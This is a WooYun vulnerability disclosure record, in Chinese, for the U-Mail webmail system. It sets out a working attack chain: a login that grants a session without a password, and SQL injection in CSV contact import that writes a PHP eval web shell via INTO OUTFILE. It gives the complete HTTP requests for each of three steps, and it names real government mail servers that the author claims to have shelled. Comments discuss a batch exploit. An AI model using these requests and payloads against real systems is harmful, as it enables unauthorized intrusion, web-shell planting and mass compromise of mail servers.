{"id": 44556, "wybug_id": "wooyun-2015-093049", "wybug_title": "U-Mail邮件系统批量getshell（真正无限制，无需普通帐号）", "wybug_corp": "U-Mail", "wybug_author": "Ano_Tom", "wybug_date": "2015-01-21 09:24", "wybug_open_date": "2015-04-21 09:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-21：\t细节向公众公开  简要描述： 该邮件系统存在任意用户登录、且存在注入，从而可以无限制完美getshell（getshell过程只需简单三个请求）。疯狗，这个不遭雷劈的话，等着被爆菊吧 详细说明：  1.邮件系统介绍1）官方下载地址：http://www.comingchina.com/html/downloads/2）版本：最新版V9.8.573）测试环境：Windows Server 2003+IIS6.0+官方默认软件4）使用案例：非常之多，政府类也较多。http://www.comingchina.com/html/case/ OR Google \"Powered by U-Mail\"漏洞文件/fast/default/operates.php\nrequire_once( LIB_PATH.\"Mailbox.php\" );require_once( LIB_PATH.\"Domain.php\" );$Mailbox = Mailbox::getinstance( );$Domain = Domain::getinstance( );if ( ACTION == \"login\" ){\t\t$url_success = \"index.php\";\t\t$url_failure = \"/webmail/\";\t\t$wc_info = array( );\t\t$wc_info['mailbox'] = strtolower( trim( $_POST['mailbox'] ) );//需要提交的用户名\t\t$wc_info['link'] = trim( $_POST['link'] );\t\t$wc_info['charset'] = trim( $_POST['charset'] );\t\t$wc_info['theme'] = trim( $_POST['theme'] );\t\t$wc_info['language'] = strtolower( trim( $_POST['language'] ) );\t\tif ( !$wc_info['link'] )\t\t{\t\t\t\tredirect( $url_failure, \"参数错误！\" );\t\t}\t\t$url_check = $wc_info['link'].\"&view=status\";\t\tget_url_data( $url_check );\t\tlist( $username, $domain_name ) = explode( \"@\", $wc_info['mailbox'] );\t\t$arr_tmp = $Domain->getDomainByName( $domain_name, \"DomainID,DomainName\", 0 );//获得域名\t\t$domain_id = $arr_tmp['DomainID'];\t\t$userinfo = $Mailbox->getMailboxByName( $domain_id, $username, \"UserID,Password,FullName,MailDir,MaxNetFileSpace\", 0 );\t\t$arr_tmp = $Domain->getPurchaseByDomainID( $domain_id, \"id,corpname\", 0 );\t\t$company = $arr_tmp['corpname'];\t\tset_session( \"is_login\", TRUE );\t\tset_session( \"worldclient\", $wc_info );\t\tset_session( \"domain_id\", $domain_id );\t\tset_session( \"domain_name\", $domain_name );\t\tset_session( \"user_id\", $userinfo['UserID'] );\t\tset_session( \"email\", $wc_info['mailbox'] );\t\tset_session( \"fullname\", $userinfo['FullName'] );\t\tset_session( \"password\", $userinfo['Password'] );\t\tset_session( \"maildir\", $userinfo['MailDir'] );\t\tset_session( \"company_name\", $company );\t\tset_session( \"language\", $wc_info['language'] );\t\tset_session( \"username\", $username );\t\tredirect( $url_success );}\nget_url_data()函数文件/admin/include/base.func.php代码为\nfunction get_url_data( $_obfuscate_Il8i, $_obfuscate_5E5Av0svlQÿÿ = 1 ){\t\t$_obfuscate_u_cÿ = curl_init( );\t\tcurl_setopt( $_obfuscate_u_cÿ, CURLOPT_URL, $_obfuscate_Il8i );\t\tcurl_setopt( $_obfuscate_u_cÿ, CURLOPT_SSL_VERIFYPEER, FALSE );\t\tcurl_setopt( $_obfuscate_u_cÿ, CURLOPT_SSL_VERIFYHOST, FALSE );\t\tcurl_setopt( $_obfuscate_u_cÿ, CURLOPT_RETURNTRANSFER, TRUE );\t\tcurl_setopt( $_obfuscate_u_cÿ, CURLOPT_CONNECTTIMEOUT, $_obfuscate_5E5Av0svlQÿÿ );\t\t$_obfuscate_6RYLWQÿÿ = curl_exec( $_obfuscate_u_cÿ );\t\tcurl_close( $_obfuscate_u_cÿ );\t\treturn $_obfuscate_6RYLWQÿÿ;}\n没什么用处，然后$arr_tmp = $Domain->getDomainByName( $domain_name, \"DomainID,DomainName\", 0 );代码所在文件为/admin/lib/Domains.php代码为\npublic function getDomainByName( $_obfuscate_yTDviRDH, $_obfuscate_tjILu7ZH = \"*\", $_obfuscate_ySeUHBwÿ = FALSE )\t\t{\t\t\t\t$_obfuscate_IRFhnYwÿ = \"DomainName='\".$_obfuscate_yTDviRDH.\"'\";\t\t\t\t$_obfuscate_6RYLWQÿÿ = $this->getone_domain( $_obfuscate_IRFhnYwÿ, $_obfuscate_tjILu7ZH, $_obfuscate_ySeUHBwÿ );\t\t\t\treturn $_obfuscate_6RYLWQÿÿ;\t\t}\n获取域名的id，然后$userinfo = $Mailbox->getMailboxByName( $domain_id, $username, \"UserID,Password,FullName,MailDir,MaxNetFileSpace\", 0 );对应文件为/admin/lib/Mailbox.php\npublic function getMailboxByName( $_obfuscate_AkPSczrCIu40, $_obfuscate_3gn_eQÿÿ, $_obfuscate_tjILu7ZH = \"*\", $_obfuscate_ySeUHBwÿ = FALSE )\t\t{\t\t\t\t$_obfuscate_AkPSczrCIu40 = intval( $_obfuscate_AkPSczrCIu40 );\t\t\t\t$_obfuscate_IRFhnYwÿ = \"DomainID='\".$_obfuscate_AkPSczrCIu40.\"' AND Mailbox='\".$_obfuscate_3gn_eQÿÿ.\"'\";\t\t\t\t$_obfuscate_6RYLWQÿÿ = $this->getone_mailbox( $_obfuscate_IRFhnYwÿ, $_obfuscate_tjILu7ZH, $_obfuscate_ySeUHBwÿ );\t\t\t\treturn $_obfuscate_6RYLWQÿÿ;\t\t}\n直接使用用户名执行了sql查询，将获取用户查询结果，并未进行password的判断，而直接set_session( \"is_login\", TRUE );从而登录成功，可以继续执行其他的方法，因而只要找一处缺陷方法即可\n\n登录成功后，如图，发现是未显示状态，但是函数都是可以执行了，因为有sessionid\n\n然后，漏洞文件为/fast/pab/module/o_contact.php 代码为\nif ( ACTION == \"contact-import\" ){\t\t$url = make_link( \"pab\", \"view\", \"index\" );\t\t$import_file = $_FILES['import_file'];//获取文件\t\t$import_group = $_POST['import_group'];\t\t$import_mode = $_POST['import_mode'];\t\t$file_path = $_FILES['import_file']['tmp_name'];\t\t$fp = @fopen( $file_path, \"r\" );\t\tif ( !$fp )\t\t{\t\t\t\tredirect( $url, \"无法打开文件！\" );\t\t}\t\t$i = 0;\t\t$file_fields = array( );\t\twhile ( !feof( $fp ) )\t\t{\t\t\t\t$line = iconv( \"GBK\", \"UTF-8\", trim( fgets( $fp, 4096 ) ) );\t\t\t\tif ( $i == 0 )\t\t\t\t{\t\t\t\t\t\t$field_map = $PAB->getExportFieldMap( );\t\t\t\t\t\t$tmp_field_arr = explode( \",\", trim( $line ) );\t\t\t\t\t\tforeach ( $tmp_field_arr as $tmp_field )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$tmp_field = trim( $tmp_field );\t\t\t\t\t\t\t\t$is_find = FALSE;\t\t\t\t\t\t\t\tforeach ( $field_map as $key => $field )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\tif ( !( $tmp_field == $field ) || !( $tmp_field == \"\\\"\".$field.\"\\\"\" ) )\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\tcontinue;\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t$file_fields[] = $key;\t\t\t\t\t\t\t\t\t\t$is_find = TRUE;\t\t\t\t\t\t\t\t\t\tbreak;\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\tif ( !$is_find )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t$file_fields[] = \"\";\t\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t$data = array( );\t\t\t\t\t\t$line_arr = explode( \",\", $line );\t\t\t\t\t\tforeach ( $line_arr as $j => $val )\t\t\t\t\t\t{\t\t\t\t\t\t\t\tpreg_match( \"/\\\"(.+?)\\\"/\", $val, $arr_tmp );\t\t\t\t\t\t\t\t$val = $arr_tmp[1] ? $arr_tmp[1] : $val;\t\t\t\t\t\t\t\tif ( !$val && !$file_fields[$j] && !( $val != \"\\\"\\\"\" ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t$data[$file_fields[$j]] = $val;//从文件读取的参数存至数组\t\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t\t\tif ( !$data )\t\t\t\t\t\t{\t\t\t\t\t\t}\t\t\t\t\t\telse\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$data['updated'] = date( \"Y-m-d H:i:s\" );\t\t\t\t\t\t\t\t$contact = $PAB->getContactByMail( $user_id, $data['pref_email'], \"contact_id\", 0 );//产生注入\t\t\t\t\t\t\t\tif ( $contact )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\tdo\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\tif ( !( $import_mode == \"ignore\" ) )\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t$where = \"contact_id='\".$contact['contact_id'].\"'\";\t\t\t\t\t\t\t\t\t\t\t\t\t\t$result = $PAB->update_contact( $data, $where, 0 );\t\t\t\t\t\t\t\t\t\t\t\t\t\tif ( !$result )\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tredirect( $url, \"更新数据失败！\" );\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t\t\tif ( $import_group && $PAB->checkMap( $user_id, $import_group, $contact['contact_id'], 0 ) )\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$contact_id = $contact['contact_id'];\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tbreak;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tbreak;\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$data['user_id'] = $user_id;\t\t\t\t\t\t\t\t\t\t\t\t$contact_id = $PAB->add_contact( $data, 0 );\t\t\t\t\t\t\t\t\t\t\t\tif ( $contact_id )\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\tbreak;\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\tredirect( $url, \"导入数据失败！\" );\t\t\t\t\t\t\t\t\t\t} while ( 0 );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\tif ( $import_group )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t$res = $PAB->addMap( $user_id, $import_group, $contact_id, 0 );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t}\t\t\t\t++$i;\t\t}\t\tfclose( $fp );\t\tredirect( $url, \"导入数据成功！\" );}\ngetContactByMail函数为/admin/lib/PAB.php\npublic function getContactByMail( $_obfuscate_nQNptTJPgÿÿ, $_obfuscate_ae6UFRQÿ, $_obfuscate_tjILu7ZH = \"*\", $_obfuscate_ySeUHBwÿ = FALSE )\t\t{\t\t//fuck getshell\t\t\t\t$_obfuscate_IRFhnYwÿ = \"user_id='\".$_obfuscate_nQNptTJPgÿÿ.\"' AND pref_email='\".$_obfuscate_ae6UFRQÿ.\"'\";\t\t\t\t$_obfuscate_6RYLWQÿÿ = $this->getone_contact( $_obfuscate_IRFhnYwÿ, $_obfuscate_tjILu7ZH, $_obfuscate_ySeUHBwÿ );\t\t\t\treturn $_obfuscate_6RYLWQÿÿ;\t\t}\ngetshell分析见上个漏洞，getshell过程为，找到一个用户名，执行如下\n\n其请求为\n\n然后将PHPSESSID放入cookie，执行如下请求即可getshell。exp中的web地址获取方式为访问/webmail/client/mail/module/test.php即可，无需登录，如图，同时该邮件系统的默认数据库连接帐号umail默认是有FILE权限的，从而可以getshell\n\n\nPOST /webmail/fast/pab/index.php?module=operate&action=contact-import HTTP/1.1Host: mail.fuck.comProxy-Connection: keep-aliveContent-Length: 814Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://mail.fuck.comUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundary77HSkP3chJHBAPXsReferer: http://mail.fuck.com/webmail/client/pab/index.php?module=view&action=indexAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4Cookie: PHPSESSID=2283f21dcf01afc8c707124764fe6bb6------WebKitFormBoundary77HSkP3chJHBAPXsContent-Disposition: form-data; name=\"import_file\"; filename=\"getshell.csv\"Content-Type: application/vnd.ms-excelÃû,µç×ÓÓÊ¼þµØÖ·,Ö÷Òªµç»°,ÉúÈÕ,×¡Õ¬µç»°,ÉÌÎñµç»°,ÓÃ»§ 1,ÓÃ»§ 2,×¡Õ¬µØÖ· ¹ú¼Ò/µØÇø,×¡Õ¬µØÖ· Ê¡/ÊÐ/×ÔÖÎÇø,×¡Õ¬µØÖ· ÊÐ/ÏØ,×¡Õ¬µØÖ· ½ÖµÀ,×¡Õ¬µØÖ· ÓÊÕþ±àÂë,ÍøÒ³,µ¥Î»,²¿ÃÅ,Ö°Îñ,ÉÌÎñµØÖ· ½ÖµÀ,ÉÌÎñµØÖ· ÓÊÕþ±àÂë,ÉÌÎñ´«Õæ,µç×ÓÓÊ¼þ 2 µØÖ·,µç×ÓÓÊ¼þ 3 µØÖ·,¸½×¢hello1,hello' AND 1=2 UNION SELECT '<?php eval($_POST[1]);' INTO OUTFILE 'C:\\\\umail\\\\WorldClient\\\\html\\\\hahahahaha.php'#,,0000-00-00,,,,,,,,,,,,,,,,,,,------WebKitFormBoundary77HSkP3chJHBAPXsContent-Disposition: form-data; name=\"import_group\"15------WebKitFormBoundary77HSkP3chJHBAPXsContent-Disposition: form-data; name=\"import_mode\"ignore------WebKitFormBoundary77HSkP3chJHBAPXs--\n获得执行的sql语句为\n150121  0:53:08\t 1986 Connect\tumail@localhost on \t\t 1986 Query\tSET NAMES 'UTF8'\t\t 1986 Init DB\tumail\t\t 1986 Query\tSELECT contact_id FROM pab_contact WHERE user_id='7' AND pref_email='hello' AND 1=2 UNION SELECT '<?php eval($_POST[1]);' INTO OUTFILE 'C:\\\\umail\\\\WorldClient\\\\html\\\\hahahahaha.php'#' LIMIT 1\t\t 1986 Query\tINSERT INTO pab_contact SET `fullname`='hello1',`pref_email`='hello' AND 1=2 UNION SELECT '<?php eval($_POST[1]);' INTO OUTFILE 'C:\\\\umail\\\\WorldClient\\\\html\\\\hahahahaha.php'#',`birthday`='0000-00-00',`updated`='2015-01-21 00:53:08',`user_id`='7'\t\t 1986 Quit\n\n\n所以综上，我们只需要知道一个邮箱用户名即可getshell，那如何批量？只需要找个默认存在的帐号即可，数据库如图\n\n默认是存在一个system帐号的，安装默认生成的，因而可以直接批量。\n\n   漏洞证明：  批量EXP就不写了吧，三个请求，一个获得web路径，一个登录获得phpsessionid（system@domain.com即可），一个getshell请求，啥也不提了，随便提交了一个第一步，获得物理路径请求\nGET /webmail/client/mail/module/test.php HTTP/1.1Host: mail.fuck.comUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-alive\n第二步，请求为，响应中获得PHPSESSID\nPOST /webmail/fast/index.php?module=operate&action=login HTTP/1.1Host: mail.fuck.comUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 30mailbox=system@fuck.com&link=?\n第三步，将PHPSESSID和路径写入如下请求，执行getshell EXP即可\nPOST /webmail/fast/pab/index.php?module=operate&action=contact-import HTTP/1.1Host: mail.fuck.comProxy-Connection: keep-aliveContent-Length: 553Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://mail.fuck.comUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundary69fA5vmkAMLB8gmAAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4Cookie: PHPSESSID=53ad27d7a64bd68d372be8a94985606d------WebKitFormBoundary69fA5vmkAMLB8gmAContent-Disposition: form-data; name=\"import_file\"; filename=\"getshell.csv\"Content-Type: application/vnd.ms-excelÃû,µç×ÓÓÊ¼þµØÖ·hello1,hello' AND 1=2 UNION SELECT '<?php eval($_POST[1]);' INTO OUTFILE 'c:\\\\umail\\\\WorldClient\\\\html\\\\shell.php'#------WebKitFormBoundary69fA5vmkAMLB8gmAContent-Disposition: form-data; name=\"import_group\"10------WebKitFormBoundary69fA5vmkAMLB8gmAContent-Disposition: form-data; name=\"import_mode\"ignore------WebKitFormBoundary69fA5vmkAMLB8gmA--\n随便测试了两个中华人民共和国广东海事局\thttp://www.gdmsa.gov.cn:3000/webmail/login9.php轻轻松松getshell广州市民防办公室http://mail.gzccad.gov.cn/webmail/login9.php\n\n\n\nmask 区域\n1.http://**.**.**/webmail/anonymous.php_2.http://**.**.**/webmail/anonymous.php_3.http://**.**.**/webmail/anonymous.php_4.http://**.**.**/webmail/anonymous.php_5.http://**.**.**/webmail/anonymous.php_6.http://**.**.**/webmail/anonymous.php_7.http://**.**.**/webmail/anonymous.php_8.http://**.**.**/webmail/anonymous.php_9.http://**.**.**/webmail/anonymous.php_10.http://**.**.**/webmail/anonymous.php_11.http://**.**.**/webmail/anonymous.php_12.http://**.**.**/webmail/anonymous.php_13.http://**.**.**/webmail/anonymous.php_14.http://**.**.**/webmail/anonymous.php_15.http://**.**.**/webmail/anonymous.php_16.http://**.**.**/webmail/anonymous.php_17.http://**.**.**/webmail/anonymous.php_18.http://**.**.**/webmail/anonymous.php_19.http://**.**.**/webmail/anonymous.php_20.http://**.**.**/webmail/anonymous.php_21.http://**.**.**/webmail/anonymous.php_22.http://**.**.**/webmail/anonymous.php_23.http://**.**.**/webmail/anonymous.php_24.http://**.**.**/webmail/anonymous.php_25.http://**.**.**/webmail/anonymous.php_26.http://**.**.**/webmail/anonymous.php_27.http://**.**.**/webmail/anonymous.php_28.http://**.**.**/webmail/anonymous.php_29.http://**.**.**/webmail/anonymous.php_30.http://**.**.**/webmail/anonymous.php_31.http://**.**.**/webmail/anonymous.php_32.http://**.**.**/webmail/anonymous.php_33.http://**.**.**/webmail/anonymous.php_34.http://**.**.**/webmail/anonymous.php_35.http://**.**.**/webmail/anonymous.php_36.http://**.**.**/webmail/anonymous.php_37.http://**.**.**/webmail/anonymous.php_38.http://**.**.**/webmail/anonymous.php_39.http://**.**.**/webmail/anonymous.php_40.http://**.**.**/webmail/anonymous.php_41.http://**.**.**/webmail/anonymous.php_42.http://**.**.**/webmail/anonymous.php_43.http://**.**.**/webmail/anonymous.php_44.http://**.**.**/webmail/anonymous.php_45.http://**.**.**/webmail/anonymous.php_46.http://**.**.**/webmail/anonymous.php_47.http://**.**.**/webmail/anonymous.php_48.http://**.**.**/webmail/anonymous.php_49.http://**.**.**/webmail/anonymous.php_50.http://**.**.**/webmail/anonymous.php_51.http://**.**.**/webmail/anonymous.php_52.http://**.**.**/webmail/anonymous.php_53.http://**.**.**/webmail/anonymous.php_54.http://**.**.**/webmail/anonymous.php_55.http://**.**.**/webmail/anonymous.php_56.http://**.**.**/webmail/anonymous.php_57.http://**.**.**/webmail/anonymous.php_58.http://**.**.**/webmail/anonymous.php_59.http://**.**.**/webmail/anonymous.php_60.http://**.**.**/webmail/anonymous.php_61.http://**.**.**/webmail/anonymous.php_62.http://**.**.**/webmail/anonymous.php_63.http://**.**.**/webmail/anonymous.php_64.http://**.**.**/webmail/anonymous.php_65.http://**.**.**/webmail/anonymous.php_66.http://**.**.**/webmail/anonymous.php_67.http://**.**.**/webmail/anonymous.php_68.http://**.**.**/webmail/anonymous.php_69.http://**.**.**/webmail/anonymous.php_70.http://**.**.**/webmail/anonymous.php_71.http://**.**.**/webmail/anonymous.php_72.http://**.**.**/webmail/anonymous.php_73.http://**.**.**/webmail/anonymous.php_74.http://**.**.**/webmail/anonymous.php_75.http://**.**.**/webmail/anonymous.php_76.http://**.**.**/webmail/anonymous.php_77.http://**.**.**/webmail/anonymous.php_78.http://**.**.**/webmail/anonymous.php_79.http://**.**.**/webmail/anonymous.php_80.http://**.**.**/webmail/anonymous.php_81.http://**.**.**/webmail/anonymous.php_82.http://**.**.**/webmail/anonymous.php_83.http://**.**.**/webmail/anonymous.php_84.http://**.**.**/webmail/anonymous.php_85.http://**.**.**/webmail/anonymous.php_86.http://**.**.**/webmail/anonymous.php_87.http://**.**.**/webmail/anonymous.php_88.http://**.**.**/webmail/anonymous.php_89.http://**.**.**/webmail/anonymous.php_90.http://**.**.**/webmail/anonymous.php_91.http://**.**.**/webmail/anonymous.php_92.http://**.**.**/webmail/anonymous.php_93.http://**.**.**/webmail/anonymous.php_94.http://**.**.**/webmail/anonymous.php_95.http://**.**.**/webmail/anonymous.php_96.http://**.**.**/webmail/anonymous.php_97.http://**.**.**/webmail/anonymous.php_98.http://**.**.**/webmail/anonymous.php_99.http://**.**.**/webmail/anonymous.php_100.http://**.**.**/webmail/anonymous.php_101.http://**.**.**/webmail/anonymous.php_102.http://**.**.**/webmail/anonymous.php_103.http://**.**.**/webmail/anonymous.php_104.http://**.**.**/webmail/anonymous.php_105.http://**.**.**/webmail/anonymous.php_106.http://**.**.**/webmail/anonymous.php_107.http://**.**.**/webmail/anonymous.php_108.http://**.**.**/webmail/anonymous.php_109.http://**.**.**/webmail/anonymous.php_110.http://**.**.**/webmail/anonymous.php_111.http://**.**.**/webmail/anonymous.php_112.http://**.**.**/webmail/anonymous.php_113.http://**.**.**/webmail/anonymous.php_114.http://**.**.**/webmail/anonymous.php_115.http://**.**.**/webmail/anonymous.php_116.http://**.**.**/webmail/anonymous.php_117.http://**.**.**/webmail/anonymous.php_118.http://**.**.**/webmail/anonymous.php_119.http://**.**.**/webmail/anonymous.php_120.http://**.**.**/webmail/anonymous.php_121.http://**.**.**/webmail/anonymous.php_122.http://**.**.**/webmail/anonymous.php_123.http://**.**.**/webmail/anonymous.php_124.http://**.**.**/webmail/anonymous.php_125.http://**.**.**/webmail/anonymous.php_126.http://**.**.**/webmail/anonymous.php_127.http://**.**.**/webmail/anonymous.php_128.http://**.**.**/webmail/anonymous.php_129.http://**.**.**/webmail/anonymous.php_130.http://**.**.**/webmail/anonymous.php_131.http://**.**.**/webmail/anonymous.php_132.http://**.**.**/webmail/anonymous.php_133.http://**.**.**/webmail/anonymous.php_134.http://**.**.**/webmail/anonymous.php_135.http://**.**.**/webmail/anonymous.php_136.http://**.**.**/webmail/anonymous.php_137.http://**.**.**/webmail/anonymous.php_138.http://**.**.**/webmail/anonymous.php_139.http://**.**.**/webmail/anonymous.php_140.http://**.**.**/webmail/anonymous.php_141.http://**.**.**/webmail/anonymous.php_142.http://**.**.**/webmail/anonymous.php_143.http://**.**.**/webmail/anonymous.php_144.http://**.**.**/webmail/anonymous.php_145.http://**.**.**/webmail/anonymous.php_146.http://**.**.**/webmail/anonymous.php_147.http://**.**.**/webmail/anonymous.php_148.http://**.**.**/webmail/anonymous.php_149.http://**.**.**/webmail/anonymous.php_150.http://**.**.**/webmail/anonymous.php_151.http://**.**.**/webmail/anonymous.php_152.http://**.**.**/webmail/anonymous.php_153.http://**.**.**/webmail/anonymous.php_154.http://**.**.**/webmail/anonymous.php_155.http://**.**.**/webmail/anonymous.php_156.http://**.**.**/webmail/anonymous.php_157.http://**.**.**/webmail/anonymous.php_158.http://**.**.**/webmail/anonymous.php_159.http://**.**.**/webmail/anonymous.php_160.http://**.**.**/webmail/anonymous.php_161.http://**.**.**/webmail/anonymous.php_162.http://**.**.**/webmail/anonymous.php_163.http://**.**.**/webmail/anonymous.php_164.http://**.**.**/webmail/anonymous.php_165.http://**.**.**/webmail/anonymous.php_166.http://**.**.**/webmail/anonymous.php_167.http://**.**.**/webmail/anonymous.php_168.http://**.**.**/webmail/anonymous.php_169.http://**.**.**/webmail/anonymous.php_170.http://**.**.**/webmail/anonymous.php_171.http://**.**.**/webmail/anonymous.php_172.http://**.**.**/webmail/anonymous.php_173.http://**.**.**/webmail/anonymous.php_174.http://**.**.**/webmail/anonymous.php_175.http://**.**.**/webmail/anonymous.php_176.http://**.**.**/webmail/anonymous.php_177.http://**.**.**/webmail/anonymous.php_178.http://**.**.**/webmail/anonymous.php_179.http://**.**.**/webmail/anonymous.php_180.http://**.**.**/webmail/anonymous.php_181.http://**.**.**/webmail/anonymous.php_182.http://**.**.**/webmail/anonymous.php_183.http://**.**.**/webmail/anonymous.php_184.http://**.**.**/webmail/anonymous.php_185.http://**.**.**/webmail/anonymous.php_186.http://**.**.**/webmail/anonymous.php_187.http://**.**.**/webmail/anonymous.php_188.http://**.**.**/webmail/anonymous.php_189.http://**.**.**/webmail/anonymous.php_190.http://**.**.**/webmail/anonymous.php_191.http://**.**.**/webmail/anonymous.php_192.http://**.**.**/webmail/anonymous.php_193.http://**.**.**/webmail/anonymous.php_194.http://**.**.**/webmail/anonymous.php_195.http://**.**.**/webmail/anonymous.php_196.http://**.**.**/webmail/anonymous.php_197.http://**.**.**/webmail/anonymous.php_198.http://**.**.**/webmail/anonymous.php_199.http://**.**.**/webmail/anonymous.php_200.http://**.**.**/webmail/anonymous.php_201.http://**.**.**/webmail/anonymous.php_202.http://**.**.**/webmail/anonymous.php_203.http://**.**.**/webmail/anonymous.php_204.http://**.**.**/webmail/anonymous.php\n\n   修复方案：  登录验证、注入问题、爆路径问题、FILE权限与邮件业务的取舍均衡问题http://pan.baidu.com/s/1gdvipFX 密码: zee5    版权声明：转载请注明来源 Ano_Tom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-01-26 08:09 厂商回复： CNVD确认并复现所述情况,与近期的同个软件漏洞一并后续联系软件生产厂商.同时根据测试用例,将分别下发给多个CNCERT分中心进行协调处置. rank 40 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-21 10:13 |    \t\tSmilent \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:6        | None)\t\t \n  你关注的绿帽子帽子 Ano_Tom 发表了漏洞 U-Mail邮件系统批量getshell    \n     2015-01-21 11:33 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  @Smilent 在批量 哈哈哈    \n     2015-01-21 11:54 |    \t\tSmilent \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:6        | None)\t\t \n  @Ano_Tom 快来一发     \n     2015-01-21 17:40 |    \t\tACGT \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:4        | another script kiddie)\t\t \n  没看到雷，洞主快去买点凡士林    \n     2015-01-21 19:28 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  @Smilent 写好批量exp了，你付乌币查看，哈哈哈哈    \n     2015-01-21 19:28 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  @ACGT 我更新下，不行就得买了，哈哈    \n     2015-01-23 13:28 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  getshell的exp请查看测试代码，这就被雷劈了。。。 :)    \n     2015-01-23 21:23 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2015-01-26 09:02 |    \t\tki11y0u \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:23        | 好好学习，求带飞~~~~~~~~~~~~~~~~~~~~~~...)\t\t \n  @Ano_Tom 40rank啊，叼~    \n     2015-01-29 09:45 |    \t\t无力落地の白 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:19        | 新人)\t\t \n  6666666      \n     2015-03-08 20:47 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  哎呀，用py写这个洞的poc写的好纠结后来换成gbk编码就好了。。。    \n     2015-03-08 22:52 